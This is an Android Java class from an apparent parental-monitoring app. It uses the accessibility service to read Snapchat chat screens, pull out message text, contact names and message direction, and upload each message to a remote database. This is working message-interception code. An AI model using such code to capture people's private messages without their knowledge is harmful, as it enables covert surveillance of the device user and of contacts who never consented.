package com.childmonitorai.monitors;
import com.childmonitorai.database.DatabaseHelper;
import com.childmonitorai.models.MessageData;

import android.graphics.Rect;
import android.util.DisplayMetrics;
import android.util.Log;
import android.view.accessibility.AccessibilityNodeInfo;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.List;
import java.util.Locale;
import java.util.Set;

public class SnapchatMonitor {
    private static final String TAG = "SnapchatMonitor";
    private static final String SNAPCHAT_PACKAGE = "com.snapchat.android";
    private final DisplayMetrics displayMetrics;
    private final DatabaseHelper databaseHelper;

    private static class MessageInfo {
        String message;
        boolean isOutgoing;

        MessageInfo(String message, boolean isOutgoing) {
            this.message = message;
            this.isOutgoing = isOutgoing;
        }
    }

    public SnapchatMonitor(DisplayMetrics displayMetrics) {
        this.displayMetrics = displayMetrics;
        this.databaseHelper = new DatabaseHelper();
    }

    public void processMessages(AccessibilityNodeInfo rootNode, Set<String> processedMessages, 
                              String userId, String deviceModel, int maxMessageLength) {
        Log.d(TAG, "Processing Snapchat messages. Root node available: " + (rootNode != null));

        if (!isSnapchatChatScreen(rootNode)) {
            Log.d(TAG, "Not in Snapchat chat screen - skipping message processing");
            return;
        }

        String contactName = extractContactName(rootNode);
        List<MessageInfo> messages = extractMessages(rootNode);

        for (MessageInfo messageInfo : messages) {
            String sanitizedMessage = sanitizeData(messageInfo.message);
            String sanitizedContactName = sanitizeData(contactName);

            if (sanitizedMessage.length() > maxMessageLength) {
                sanitizedMessage = sanitizedMessage.substring(0, maxMessageLength);
            }

            String messageKey = sanitizedMessage + "|" + messageInfo.isOutgoing + "|" + sanitizedContactName;

            if (processedMessages.add(messageKey)) {
                MessageData messageData = new MessageData(
                    messageInfo.isOutgoing ? "You" : contactName,
                    messageInfo.isOutgoing ? contactName : "You",
                    messageInfo.message,
                    String.valueOf(System.currentTimeMillis()),
                    messageInfo.isOutgoing ? "outgoing" : "incoming",
                    "snapchat"
                );

                String uniqueMessageId = sanitizedContactName + "|" + messageInfo.isOutgoing + "|" + 
                                       sanitizedMessage + "|" + System.currentTimeMillis();
                String messageDate = new SimpleDateFormat("yyyy-MM-dd", Locale.getDefault()).format(new Date());

                databaseHelper.uploadSocialMessageData(userId, deviceModel, messageData, 
                                                     uniqueMessageId, messageDate, "snapchat");
            }
        }
    }

    private boolean isSnapchatChatScreen(AccessibilityNodeInfo rootNode) {
        if (rootNode == null) return false;

        String[] chatIndicators = {
            SNAPCHAT_PACKAGE + ":id/chat_input_text_field",
            SNAPCHAT_PACKAGE + ":id/chat_message_list",
            SNAPCHAT_PACKAGE + ":id/chat_input_layout",
            SNAPCHAT_PACKAGE + ":id/chat_message_composer",
            SNAPCHAT_PACKAGE + ":id/chat_screen_container"
        };

        int indicatorsFound = 0;
        for (String indicator : chatIndicators) {
            if (!rootNode.findAccessibilityNodeInfosByViewId(indicator).isEmpty()) {
                indicatorsFound++;
                if (indicatorsFound >= 2) return true;
            }
        }
        return false;
    }

    private String extractContactName(AccessibilityNodeInfo rootNode) {
        String[] snapchatIds = {
            SNAPCHAT_PACKAGE + ":id/chat_title_bar_username",
            SNAPCHAT_PACKAGE + ":id/chat_username_text",
            SNAPCHAT_PACKAGE + ":id/chat_friend_name",
            SNAPCHAT_PACKAGE + ":id/conversation_title",
            SNAPCHAT_PACKAGE + ":id/username_text",
            SNAPCHAT_PACKAGE + ":id/display_name_text"
        };

        for (String id : snapchatIds) {
            List<AccessibilityNodeInfo> nodes = rootNode.findAccessibilityNodeInfosByViewId(id);
            for (AccessibilityNodeInfo node : nodes) {
                String name = extractValidName(node);
                if (name != null) return name;
            }
        }

        return "Snapchat User";
    }

    private List<MessageInfo> extractMessages(AccessibilityNodeInfo rootNode) {
        List<MessageInfo> messages = new ArrayList<>();
        String[] messageIds = {
            SNAPCHAT_PACKAGE + ":id/chat_message_text",
            SNAPCHAT_PACKAGE + ":id/chat_message_content",
            SNAPCHAT_PACKAGE + ":id/message_text_view",
            SNAPCHAT_PACKAGE + ":id/chat_message"
        };

        for (String id : messageIds) {
            List<AccessibilityNodeInfo> nodes = rootNode.findAccessibilityNodeInfosByViewId(id);
            for (AccessibilityNodeInfo node : nodes) {
                if (node != null && node.getText() != null) {
                    messages.add(new MessageInfo(
                        node.getText().toString(),
                        isOutgoingMessage(node)
                    ));
                }
            }
        }
        return messages;
    }

    private boolean isOutgoingMessage(AccessibilityNodeInfo node) {
        AccessibilityNodeInfo parent = node;
        int maxDepth = 10;
        int currentDepth = 0;

        while (parent != null && currentDepth < maxDepth) {
            String viewId = parent.getViewIdResourceName();
            if (viewId != null && (viewId.contains("outgoing") || viewId.contains("sent") || 
                viewId.contains("right_aligned") || viewId.contains("chat_message_sent"))) {
                return true;
            }

            Rect bounds = new Rect();
            parent.getBoundsInScreen(bounds);
            if (bounds.right > displayMetrics.widthPixels * 0.7) {
                return true;
            }

            parent = parent.getParent();
            currentDepth++;
        }
        return false;
    }

    private String extractValidName(AccessibilityNodeInfo node) {
        if (node == null || node.getText() == null) return null;
        String name = node.getText().toString().trim();
        return isValidUsername(name) ? name : null;
    }

    private boolean isValidUsername(String text) {
        if (text == null || text.isEmpty() || text.length() > 30) return false;
        String[] invalidTexts = {
            "Chat", "Snap", "Story", "Stories", "Camera", "Memories",
            "Discover", "Spotlight", "Map", "Send To", "New Chat",
            "Add Friends", "Search", "Settings", "Snapchat User"
        };
        for (String invalid : invalidTexts) {
            if (text.equalsIgnoreCase(invalid)) return false;
        }
        return text.matches("^[\\w.-]+$");
    }

    private String sanitizeData(String input) {
        if (input == null) return "_empty_";
        String sanitized = input.replaceAll("[^a-zA-Z0-9_-]", "_");
        return sanitized.matches("^[0-9].*") ? "_" + sanitized : 
               sanitized.isEmpty() ? "_empty_" : sanitized;
    }
}
